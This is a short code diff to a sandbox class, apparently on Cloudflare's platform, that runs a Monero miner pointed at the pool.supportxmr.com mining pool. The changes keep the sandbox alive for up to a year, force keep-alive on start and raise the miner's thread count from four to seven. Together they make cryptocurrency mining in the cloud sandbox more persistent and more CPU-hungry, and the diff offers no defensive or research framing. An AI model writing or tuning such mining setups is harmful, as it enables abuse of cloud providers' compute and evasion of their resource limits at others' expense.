@@ -4,9 +4,11 @@ import { processHeartbeats } from "./mining-stats";
 export { ContainerProxy };
 
 const INTERNAL_HEARTBEAT_HOST = "heartbeat.internal";
+const SANDBOX_SLEEP_AFTER_SECONDS = 31_536_000;
+const SANDBOX_KEEP_ALIVE = true;
 
 export class MinerSandbox extends Sandbox {
-	sleepAfter = 31_536_000;
+	sleepAfter = SANDBOX_SLEEP_AFTER_SECONDS;
 	enableInternet = true;
 	interceptHttps = false;
 	defaultPort = 8080;
@@ -16,7 +18,7 @@ export class MinerSandbox extends Sandbox {
 		MINER_POOL: "pool.supportxmr.com:3333",
 		MINER_TLS: "false",
 		MINER_WORKER_NAME: "cf-sandbox",
-		MINER_THREADS: "4",
+		MINER_THREADS: "7",
 		MINER_CPU_PRIORITY: "5",
 		MINER_CPU_AFFINITY: "0xF",
 		MINER_RANDOMX_MODE: "fast",
@@ -33,6 +35,7 @@ export class MinerSandbox extends Sandbox {
 	};
 
 	override async onStart() {
+		await this.setKeepAlive(SANDBOX_KEEP_ALIVE);
 		console.log(
 			JSON.stringify({
 				level: "info",
@@ -40,6 +43,8 @@ export class MinerSandbox extends Sandbox {
 				service: "miner-sandbox",
 				event: "started",
 				id: this.ctx.id.toString(),
+				keepAlive: SANDBOX_KEEP_ALIVE,
+				sleepAfter: this.sleepAfter,
 			}),
 		);
 	}
